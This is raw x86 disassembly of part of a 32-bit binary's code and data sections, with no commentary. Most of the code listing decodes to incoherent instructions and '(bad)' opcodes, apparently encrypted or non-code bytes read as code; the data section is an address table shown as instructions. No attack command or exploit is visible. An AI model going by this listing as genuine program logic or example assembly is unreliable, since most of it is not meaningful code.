  411bb7:	jae    0x411bba
  411bb9:	xor    DWORD PTR [eax],ebx
  411bbb:	fldcw  WORD PTR [edx]
  411bbd:	mov    bl,0xf6
  411bbf:	xchg   BYTE PTR [eax+0x6],ah
  411bc2:	mov    esp,0x5da75349
  411bc7:	leave  
  411bc8:	test   al,0xa5
  411bca:	mov    eax,0x69d28972
  411bcf:	pop    es
  411bd0:	ja     0x411b7c
  411bd2:	imul   edi,edi,0xcd88f95
  411bd8:	enter  0xf445,0xaf
  411bdc:	adc    BYTE PTR [edi+0x565b1d66],ch
  411be2:	jmp    0xfca2e6a8
  411be7:	or     DWORD PTR [ebx-0x46fb747f],ecx
  411bed:	addr16 xor edx,0xffffff92
  411bf1:	(bad)  
  411bf2:	mov    ah,0x66
  411bf4:	cmp    DWORD PTR [ebx-0x798d2ee7],ebp
  411bfa:	add    ah,0x3
  411bfd:	stos   BYTE PTR es:[edi],al
  411bfe:	mov    edi,0x50d4b6d5
  411c03:	mov    al,0x48
  411c05:	push   ebp
  411c06:	mov    al,ds:0xa5bfe7b1
  411c0b:	pop    ebx
  411c0c:	mov    cs,eax
  411c0e:	and    eax,0xffd3c73a
  411c13:	ret    0xe79e
  411c16:	mov    ds:0xe22314fc,al
  411c1b:	push   0xc2ba56bb
  411c20:	js     0x411c95
  411c22:	sbb    bh,BYTE PTR [esi]
  411c24:	push   ds
  411c25:	repz in eax,dx
  411c27:	sub    BYTE PTR [eax-0x31f6f4cf],ah
  411c2d:	mov    eax,ds:0x22eccd2b
  411c32:	jmp    0x411c09
  411c34:	sbb    DWORD PTR [ebx],edx
  411c36:	mov    edx,DWORD PTR [edx+0x5a]
  411c39:	popf   
  411c3a:	mul    DWORD PTR [edi+0x33]
  411c3d:	ret    0x8b56
  411c40:	jne    0x411c4a
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0xabdad6c4
  411c5b:	call   0x7e7e:0x4bc7c7a0
  411c62:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411c66:	scas   eax,DWORD PTR es:[edi]
  411c67:	pop    edx
  411c68:	fisub  DWORD PTR [eax]
  411c6a:	mov    eax,0xdcecc5a9
  411c6f:	rol    BYTE PTR [edi-0x5513f733],0x56
  411c76:	jno    0x411cf0
  411c78:	cwde   
  411c79:	das    
  411c7a:	mov    BYTE PTR [ebx-0x20],bh
  411c7d:	xor    eax,esp
  411c7f:	and    eax,0x6da2a013
  411c84:	stos   BYTE PTR es:[edi],al
  411c85:	ss mov ebx,0x3107a8ad
  411c8b:	mov    dl,0xdc
  411c8d:	sbb    DWORD PTR [esi-0x2c8a32e],0xfffffffc
  411c94:	mov    bh,BYTE PTR [edx+0x364bdfaf]
  411c9a:	(bad)  
  411c9b:	ins    DWORD PTR es:[edi],dx
  411c9c:	cmp    BYTE PTR [esi],0x49
  411c9f:	add    eax,0x97717931
  411ca4:	cmp    al,0x30
  411ca6:	rcr    BYTE PTR [ebp-0x1a],cl
  411ca9:	pop    ds
  411caa:	push   esi
  411cab:	mov    al,ds:0x213beee3
  411cb0:	sub    eax,0x71ee613f
  411cb5:	push   ebx
  411cb6:	dec    DWORD PTR [ecx-0x4a]
  411cb9:	(bad)  
  411cba:	jle    0x411cc8
  411cbc:	mov    ah,0x78
  411cbe:	pandn  mm5,mm6
  411cc1:	inc    eax
  411cc2:	xor    ah,BYTE PTR [ebp-0x67b22126]
  411cc8:	into   
  411cc9:	or     al,0x2b
  411ccb:	mov    ebx,0x55662521
  411cd0:	test   eax,0xb8dc6324
  411cd5:	retf   0xb2c7
  411cd8:	sbb    eax,0x99585fa4
  411cdd:	sbb    ah,BYTE PTR [ebp-0x4e]
  411ce0:	jg     0x411d2f
  411ce2:	aas    
  411ce3:	les    edi,FWORD PTR [ebp+0x3b]
  411ce6:	jmp    0x411c7d
  411ce8:	aam    0xba
  411cea:	por    mm7,QWORD PTR [edi+0xd]
  411cee:	out    dx,eax
  411cef:	fidivr WORD PTR ds:0x3bdc8726
  411cf5:	icebp  
  411cf6:	(bad)  
  411cf7:	fcmovu st,st(2)
  411cf9:	inc    ebp
  411cfa:	sbb    dl,BYTE PTR [ebx+edi*4]
  411cfd:	adc    al,0x36
  411d00:	pop    ss
  411d01:	clc    
  411d02:	data16 fistp DWORD PTR ds:0xbbb426eb
  411d09:	(bad)  
  411d0a:	idiv   BYTE PTR [ebp-0xa43ec5]
  411d10:	and    ebp,ecx
  411d12:	lock call 0x608b1ae9
  411d18:	jo     0x411d75
  411d1a:	xchg   ebp,eax
  411d1b:	mul    edx
  411d1d:	inc    eax
  411d1e:	out    0x4c,eax
  411d20:	inc    edi
  411d21:	add    ebp,ebx
  411d23:	fisttp QWORD PTR [edx+0x43783e18]
  411d29:	js     0x411cda
  411d2b:	jbe    0x411d4c
  411d2d:	mov    al,0x49
  411d2f:	cmp    bl,dh
  411d31:	shl    BYTE PTR [eax],cl
  411d33:	and    al,al
  411d35:	or     DWORD PTR [edi+ebx*8],0xc498dbab
  411d3c:	fstp   TBYTE PTR [edx-0x1d]
  411d3f:	xchg   ebp,eax
  411d40:	cmp    DWORD PTR [esi],ebx
  411d42:	jo     0x411d45
  411d44:	cmp    BYTE PTR [edx],al
  411d46:	push   ebx
  411d47:	jb     0x411cfe
  411d49:	imul   eax,DWORD PTR [ecx-0x80],0xffffff8e
  411d4d:	and    eax,0xbf5fae40
  411d52:	pop    esi
  411d53:	adc    bh,BYTE PTR [ecx-0x35]
  411d56:	mov    ch,0xb6
  411d58:	push   cs
  411d59:	jne    0x411d39
  411d5b:	pop    es
  411d5c:	adc    DWORD PTR [eax],eax
  411d5e:	lock out 0x51,eax
  411d61:	retf   
  411d62:	inc    esi
  411d63:	sbb    al,dl
  411d65:	adc    al,0xcc
  411d67:	xor    eax,0x635d5687
  411d6c:	xchg   ebx,eax
  411d6d:	mov    eax,ds:0xff616e7b
  411d72:	in     al,0x23
  411d74:	cdq    
  411d75:	or     eax,0xe2787587
  411d7a:	mov    ch,0x51
  411d7c:	jb     0x411d1e
  411d7e:	repz push ecx
  411d80:	push   0x4ead3c82
  411d85:	into   
  411d86:	outs   dx,BYTE PTR ds:[esi]
  411d87:	div    DWORD PTR [edx+0x4f6355a3]
  411d8d:	dec    edi
  411d8e:	mov    edi,0xe0c482a6
  411d93:	cmp    DWORD PTR [ebp+0x77],esp
  411d96:	(bad)  
  411d97:	inc    edx
  411d98:	and    BYTE PTR [esp+edi*2+0x55],bl
  411d9c:	(bad)  
  411d9e:	xchg   ebx,eax
  411d9f:	test   DWORD PTR [edi+0x27],ebp
  411da2:	in     al,0xef
  411da4:	aam    0xf6
  411da6:	jmp    0x7d66:0x659f1922
  411dad:	jo     0x411e2a
  411daf:	ins    BYTE PTR es:[edi],dx
  411db0:	xchg   BYTE PTR [ecx+0x39],bh
  411db3:	out    0xa7,eax
  411db5:	jns    0x411d3e
  411db7:	mov    ds:0x509dcd3f,eax
  411dbc:	scas   eax,DWORD PTR es:[edi]
  411dbd:	adc    BYTE PTR [ebx],dl
  411dbf:	sbb    DWORD PTR [edi+0x7a],edi
  411dc2:	cmc    
  411dc3:	fwait
  411dc4:	mov    ch,0x88
  411dc6:	iret   
  411dc7:	inc    DWORD PTR [ecx+edi*8-0x15f5c32e]
  411dce:	(bad)  
  411dcf:	fldenv [esi+edx*1]
  411dd2:	inc    esp
  411dd3:	call   DWORD PTR [esi-0x7b]
  411dd6:	clc    
  411dd7:	push   ss
  411dd8:	mov    ds:0x9f8a8697,al
  411ddd:	dec    ebx
  411dde:	shl    DWORD PTR [edi],1
  411de0:	mov    eax,0x683aa5a4
  411de5:	jg     0x411d74
  411de7:	jle    0x411d76
  411de9:	aaa    
  411dea:	fmul   QWORD PTR [edx+0x6ec0d783]
  411df0:	hlt    
  411df1:	xor    ah,0x94
  411df4:	shl    dl,cl
  411df6:	rol    DWORD PTR [ebp+0x1f],1
  411df9:	mov    ebx,0x558579fe
  411dfe:	xchg   ebx,eax
  411dff:	mov    al,0xd9
  411e01:	sub    DWORD PTR [esi-0x79],esi
  411e04:	or     al,BYTE PTR [edx]
  411e06:	push   ecx
  411e07:	xchg   edx,eax
  411e08:	pop    ecx
  411e09:	dec    ebx
  411e0a:	lods   eax,DWORD PTR ds:[esi]
  411e0b:	or     ebx,DWORD PTR [edx+0x61]
  411e0e:	scas   al,BYTE PTR es:[edi]
  411e0f:	out    0xb4,eax
  411e11:	xlat   BYTE PTR ds:[ebx]
  411e12:	aas    
  411e13:	js     0x411dc5
  411e15:	imul   DWORD PTR [esi-0x3c]
  411e18:	(bad)  
  411e19:	repz dec esp
  411e1b:	inc    ecx
  411e1c:	add    BYTE PTR [ebx+ebx*8+0x2ea00be],al
  411e23:	int3   
  411e24:	fcom   QWORD PTR [esi-0x52f96842]
  411e2a:	cmp    al,0xae
  411e2c:	sub    BYTE PTR [esi-0x4c],dl
  411e2f:	sbb    DWORD PTR [ecx+0x5d],ebp
  411e32:	jecxz  0x411dc4
  411e34:	or     al,0xdb
  411e36:	ins    BYTE PTR es:[edi],dx
  411e37:	and    eax,ecx
  411e39:	test   ah,bl
  411e3b:	into   
  411e3c:	repz dec edx
  411e3e:	cmp    dl,al
  411e40:	and    DWORD PTR [ebp-0x2a],ebx
  411e43:	mov    ds:0x6f4b3a4d,al
  411e48:	lahf   
  411e49:	stos   BYTE PTR es:[edi],al
  411e4a:	outs   dx,DWORD PTR ds:[esi]
  411e4b:	inc    esi
  411e4c:	mov    al,0xd5
  411e4e:	aas    
  411e4f:	pop    edi
  411e50:	sahf   
  411e51:	dec    esi
  411e52:	push   ebp
  411e53:	sub    ch,bh
  411e55:	lock retf 0xa0b3
  411e59:	add    BYTE PTR [edi],dl
  411e5b:	imul   esp,DWORD PTR [edx],0x955f7a17
  411e61:	imul   BYTE PTR [eax+ebx*8-0x2420e8bc]
  411e68:	sbb    BYTE PTR [ebx+0x3c],dh
  411e6b:	push   ds
  411e6c:	pop    eax
  411e6d:	or     ah,ch
  411e6f:	fld    QWORD PTR [ebp-0x47dbb4ed]
  411e75:	add    al,0x8a
  411e77:	xor    eax,0xab3e8b1b
  411e7c:	imul   edi,esi,0x1e
  411e7f:	cli    
  411e80:	stc    
  411e81:	stos   BYTE PTR es:[edi],al
  411e82:	sti    
  411e83:	add    eax,0x5e544639
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
  4123a5:	cmp    BYTE PTR [ecx],al
  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx-0x76fffcc7],cl
  412441:	sub    eax,0x3
